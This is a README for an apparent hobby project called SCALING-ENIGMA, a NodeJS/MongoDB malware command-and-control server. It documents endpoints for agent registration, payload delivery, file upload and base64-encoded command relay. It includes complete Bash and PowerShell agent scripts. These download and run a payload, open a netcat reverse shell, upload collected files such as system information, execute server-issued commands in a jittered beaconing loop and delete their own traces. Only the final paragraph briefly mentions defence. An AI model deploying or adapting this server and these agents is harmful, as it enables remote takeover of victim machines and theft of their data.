# SCALING-ENIGMA: Basic Malware C2 Server

# Table of Contents
1. Introduction
2. Installation
3. Concept of Operation
4. Integration with Agents
5. Conclusion

# Introduction

This is a beginner hobby project and demonstrator for how, with repeated application of a few basic functions, a server on the internet can be created to host malware and communicate with remote hosts. It gives examples of how upload / download APIs may be crafted and abused to serve malware and communicate via HTTP. The chosen platform for this demonstrator is NodeJS, as it is well-known for being easy to use and deploy; hence backend support would then be through Mongoose / MongoDB for easy integration.

<b>Disclaimer</b>: While I've tried my best to review and test the code, it's likely that bugs abound. Feel free to use, but <b>be careful</b>!

# Installation

For convenience, the entire code is hosted in `app.js`. The dependencies can be installed as per standard procedures with NodeJS - take a look at package.json for the list of required packages. NodeJS can be installed and run off-the-shelf from their website (https://nodejs.org/en/download/). MongoDB was chosen as the backend database, and local installation is similarly quite straightforward (https://www.mongodb.com/try/download/community).

On Linux, to test the server locally (after installing NodeJS and MongoDB): 
1. Clone into a working directory
2. Initialise the built-in NodeJS node package manager (npm) `npm init`, accept defaults
3. Install dependencies: `npm install <<package1>> <<package2>>....<<package-last>>`. The list of dependencies can be seen from the <b>require('package')</b> script at the top of `app.js`.
4. In a separate terminal window, start the mongod server, i.e. `mongod --dbpath /PATH/TO/DB`
5. Start the server: run `node app.js`
6. To prepare the database and test the full functionality of the server, recommend to execute the following in sequence:
```
curl -X POST localhost:4000/register/c2 -d "username=admin&password=^PASSWORD^" #Create the admin user with a chosen password
curl -X POST localhost:4000/login -d "username=admin&password=^PASSWORD^" -c cookie.txt #Login and retrieve the cookie
curl localhost:4000/admin/createCommand -b cookie.txt #As admin user, create Command document to store C2 control flags and commands (see write-up below)
curl localhost:4000/admin/activity/createTestDummy -b cookie.txt #Creates dummy user
curl localhost:4000/admin/activity -b cookie.txt #Logs test data to dummy user
```
7. Verify logs in the database through `mongo`:
```
show dbs
use <<DATABASE_NAME>> #Defined by user in app.js
show collections #verify collections are set up as required
db.guests.find({ guestID : "TestDummy" }) #Retrieve log records for TestDummy that was created earlier
```

# Concept of Operation

## Mission

The server's role is to provide a platform for the delivery of malware, uploading and storage of files and data, and enable two-way relay of commands / output. It does so through providing interfaces for file upload and download, and integrating with a cloud database (such as MongoDB Atlas) to store files and data. While primarily serving as a data repository, it also needs to keep track of active agents, log connections, and provide situational awareness for users conducting a campaign. As a basic setup, comms encryption is not currently implemented and all data is served through HTTP.

## Platform Overview

Server actions are driven by API calls from a companion agent script running from a victim. Naturally, it is up to the developer to design a suitable companion script with the resources and environment available at the victim. An example of such a script using Bash will be shown below, but the idea is for each call to be as simple and modular as possible. The APIs can be grouped into three categories of core functions: first, the <b>C2 Section</b>, which forms the bulk of interactions between the server and agents; second, the <b>Admin Section</b>, which allows an authenticated admin user access to the database and interact with the agents; and lastly, the <b>Diagnostics Section</b>, which caters for troubleshooting and database initialisation checks.

### C2 Section

The C2 Section handles agent <b>registration</b>, <b>serves files / text </b>, <b>receives files / text</b>, and finally oversees agent <b>de-registration</b>. Underpinning the C2 Section is a <b>logging</b> mechanism that tracks activity of each agent, and stores the information in MongoDB.

#### Agent Registration and De-Registration

SCALING-ENIGMA tracks agent activity through assigning `guestIDs` to each agent. The `guestID` is generated through a simple MD5 hash of the concatenation of IP address, timestamp and a random number. The `guestID`-agent relationship is enforced through a guestbook management system which requires that all API interactions include the `guestID` parameter. The guestbook system also acts as a <b>whitelist</b> and prevents unintended access from elsewhere on the internet. 

For a companion agent to successfully interact with the server, its first "hello" must be `GET /register`. The server will reply with `guestID` and add the agent to the whitelist. The agent will then use `guestID` as a parameter to access the other APIs needed for its role.

Once all actions are complete, the agent should de-register with the server by calling `GET /bye/:guestID`. This removes the `guestID` from the whitelist; the agent will need to re-register again to access the APIs.

#### File Upload and Download

`GET /download/:guestID` The main purpose of the server, which is to serve a prepared file `binary` that can be executed for other purposes on the victim. An example would be `netcat-traditional` which is an old version of netcat that has the `-e` option enabled for easy reverse shell connections.

`POST /uploads/:guestID` An agent may be required to transmit files out to the server, such as `/etc/passwd` and the like. The upload functionality is provided by the `multer` package. The files will be stored in MongoDB; MongoDB uses its GridFS module to 'chunk' data into 255kb pieces and is 'reassembled' when necessary. 

#### Command Relays

The command relay system allows an agent to request the server for command-line inputs, and to relay the output back to the server. The output will be stored in the agent logs for subsequent review. When agents are first registered with the guestbook, the command `whoami` is included as default, and can be updated by the `admin` user through another API interaction (see <b>Admin Section</b>).

`GET /control/:guestID` Retrieves the control flag (either 1 or 0). Agents can be designed to check this control flag to determine if the server is ready to send commands and receive output from the agent.

`GET /stdin/:guestID` Retrieves the command stored in the agent's guestbook as `latest_cmd` (see below). Defaults to `whoami`. If for any reason `latest_cmd` is blank, will then search for the Command document and retrieve the command stored there (see below APIs in the <b>Admin Section</b>).  To help mitigate compatibility issues, commands will be sent in base64 and decoding is expected at the agent side.

`POST /stdout/:guestID` Allows the agent to send the output of an invoked command as part of the POST request body. Similarly to help mitigate compatibility issues, it expects base64. A nifty way to do this is through a pipe: ``echo "stdout=`${cmd} | base64`" | curl -d @- SERVER/stdout/:guestID``

#### Logging

The core of the C2 logging system is the guestbook: 

```
    const guestSchema = new mongoose.Schema ({
        guestID: String,
        ip_address: String,
        time_in: String,
        time_out: String,
        activity: [{timestamp: String, comment: String}],
        filelist: [{file_id: mongoose.Schema.Types.ObjectId, filename: String}],
        latest_cmd: String
});
```

With the above schema, each agent / `guestID`'s activity is updated when the relevant APIs are accessed. Some examples: a file uploaded by `guestID` will have this event recorded under `filelist` with the appropriate `file_id` and `filename`; and under the command relay regime, output from the agent will be updated as an entry in `activity`. Ideally, after the agent has completed its tasks, the user will be able to have a detailed picture of what transpired with this particular host.

### Admin Section

The Admin Section handles <b>User Registration</b>, <b>Login / Logout</b>, <b>Asset and Logs Management</b>, and <b>Command and Control</b> functions. While these functions can account for most of the common tasks expected of a malware campaign, the users may also wish to access their database directly and perform the related actions there. The authentication system is provided by PassportJS, another popular NodeJS package. For basic security, SCALING-ENIGMA has incorporated a lockout policy to prevent the usual brute force attacks on the APIs.

#### User Registration and Login / Logout

`POST /register/c2` Meant as a one-time setup for new database instances to create the `admin` user with a chosen password, and adds `admin` to the whitelist (however, do note `admin` is not a valid `guestID` for the C2 APIs). Does nothing if `admin` is not specified as the username. Also does nothing if `admin` is already registered, hence no password overwrites are possible - the database entry needs to be manually dropped first.

`POST /login` Uses PassportJS to authenticate the `admin` user, and sends a cookie that will be needed for the rest of the Admin Section interactions. The lockout policy is in force here through if / else checking of incorrect login attempts; a successful login will reset this counter. If the account is locked out, the user will have to manually sort this out at the database side by dropping the entry and re-registering, or manually amending the `loginCount` key in `users`.

`GET /logout` It's good practice to logout of the session and invalidate the cookie, although it's easy to forget if using `curl`!

#### Asset and Logs Management

All APIs here require authenticated access. If using `curl`, the `-b <<cookie.txt>>` option is needed.

`GET /admin/filelist` This returns a json with the list of all files currently in the database.

`GET /admin/logging` This returns a json with all guestbook logs.

`GET /admin/assets` This returns a json with the whitelist, i.e. available assets with running agents that have not de-registered.

`GET /admin/download/:filename` Downloads the first file found in the database with the indicated filename in the parameter. <b>CAUTION: Please check if the file is sent by a legitimate agent. The risk of getting hit by malware through this channel is quite high; work out a Hand-Over-Take-Over system with the agent's uploads to help mitigate this risk.</b>

#### Command and Control

Same as above, authenticated access is required.

`POST /admin/cmd/update` Through specifying the required `guestID` and new command `cmd` in the POST request, update the relevant agent's guestbook with a new command for use with the command relay regime.

`GET /admin/cmd/flag/:flag` Updates the control flag with the value of the parameter provided. Only accepts 0 or 1; makes it easier for the agent to interact with. This is a configurable setting for security reasons; as the command relay regime is a two-way street, users may wish to disable it in order to reduce the counter-attack surface.

### Diagnostic Section

More of an extension to the <b>Admin Section</b>, and all require authenticated access.

`GET /admin/activity/createTestDummy` Generates a TestDummy with some default values in the guestbook. Useful for a first-time setup and helps to distinguish diagnostic interactions from actual agents in the field. Once TestDummy is created, logging tests can be made via:

`GET /admin/activity` With each call, updates the TestDummy with diagnostic activity and the relevant timestamps. Can be repeated as required. This checks the logging functions and validates database writing capability.

`GET /admin/logincheck` Simple session check if the provided login cookie is valid. As good practice, check this before interacting with the `Admin Section` APIs.

`GET /admin/createCommand` Similar to `/register/c2`, this is meant for first-time setup to initialise the command relay regime by creating the below document. Does nothing if it already exists.

```
const command = new Command({
    user: "admin",
    flag: 1,
    cmd: "whoami"
    });
```

## Integration with Agents

Below is an example of a possible Bash agent that integrates with the APIs in SCALING-ENIGMA. This agent can do the following:

- [x] Register with SCALING-ENIGMA and store guestID in a variable
- [x] Download a payload fom SCALING-ENIGMA and execute as required 
- [x] Create a script info.sh that is able to run commands and log output into /tmp/info.txt
- [x] Send /tmp/info.txt to SCALING-ENIGMA
- [x] Retrieve the control flag from SCALING-ENIGMA and checks if command relay regime is in force
- [x] While it is in force, performs beaconing activity to request and relay information from / to SCALING-ENIGMA
- [x] Afterwards, de-registers from SCALING-ENIGMA 
- [x] Performs clean-up of artefacts and deletes itself after completion

```
#!/bin/bash

#Registration and storing guestID in variable
export ID=$(curl -s SERVER/register);

#Download and execute payload (e.g. legacy netcat)
curl -s SERVER/download/$ID -o /tmp/evil
/tmp/evil IP_ADDRESS PORT -e /bin/bash #Just open nc -lnvp PORT to receive the reverse shell!

#Create and run scripts
cat <<EOF > /tmp/info.sh
#!/bin/bash

echo "Output for ${ID}";
echo $'\n';
uname -a;
echo $'\n';
echo $'\n';
EOF

bash /tmp/info.sh > /tmp/info.txt

#Exfiltrate data
curl -F file=@/tmp/info.txt SERVER/uploads/$ID
sleep 1

#Command Relay regime
export flag=$(curl -s SERVER/control/$ID)
while [ $flag -ne 0 ];
do
    export cmd=$(curl -s SERVER/stdin/$ID | base64 -d);
    sleep 10;
    echo "stdout=`${cmd} | base64`" | curl -d @- SERVER/stdout/$ID; #executes cmd and relays stdout in POST request body
    sleep 60; #Beaconing interval
    unset cmd;
    export flag=$(curl -s SERVER/control/$ID);
    sleep 10;
done

#De-registration
curl -s SERVER/bye/$ID

#Clean-up
unset ID
unset flag
rm /tmp/info.sh
rm /tmp/info.txt

#Deletes itself
rm -- "$0"

```
As the server waits indefinitely for HTTP connections, a trickier beaconing regime is possible, using `/dev/random` to adjust its beaconing frequency slightly:

```
#Snippet

export flag=$(curl -s SERVER/control/$ID)
while [ $flag -ne 0 ];
do
    export cmd=$(curl -s SERVER/stdin/$ID | base64 -d);
    export timer=$(($(od -An -N1 -i /dev/random) % 9 + 1)) #$((...)) performs arithmetic evalution of its contents 
    sleep $(($timer*5));
    echo "stdout=`${cmd} | base64`" | curl -d @- SERVER/stdout/$ID; #executes cmd and relays stdout in POST request body
    sleep $(($timer*7));
    unset cmd;
    export flag=$(curl -s SERVER/control/$ID);
    sleep $(($timer*3));
    unset timer;
done

```
One can do something similar with Powershell. The below Powershell agent performs regular HTTP beaconing and will de-register itself once it detects that the control flag is de-activated:

```
$ip = IP_ADDRESS
$port = SERVER_PORT
$server_url = "http://" + "$ip" + ":" + "$port/"

$ID = (Invoke-WebRequest -Uri ($server_url + "register")).Content

$flag = (Invoke-WebRequest -Uri ($server_url + "control/$ID")).Content

while ($flag -eq "1"){

    $cmd64 = (Invoke-WebRequest -Uri ($server_url + "stdin/$ID")).Content
    $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cmd64))
    Start-Sleep -Seconds 10
    $output = Invoke-Expression $cmd
    $data = @{stdout = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($output))}
    Invoke-WebRequest -Uri ($server_url + "stdout/$ID") -Body $data -Method 'POST' > $null
    Start-Sleep -Seconds 60
    $flag = (Invoke-WebRequest -Uri ($server_url + "control/$ID")).Content
    Start-Sleep -Seconds 10
}

Invoke-WebRequest -Uri ($server_url + "bye/$ID") > $null
```


## Conclusion

SCALING-ENIGMA is a demonstrator for a simple malware C2 server that, with a suitable agent, can serve malware and communicate with the victim via HTTP. Teamwork, between server and agent, makes the dream work - from a defenders' perspective, preventing the agent from connecting to the server is the simplest countermeasure. This is because malware servers in the cloud usually require action from cloud providers to perform takedowns, and threat actors can just spin up another instance somewhere else so long as the agent is operational.
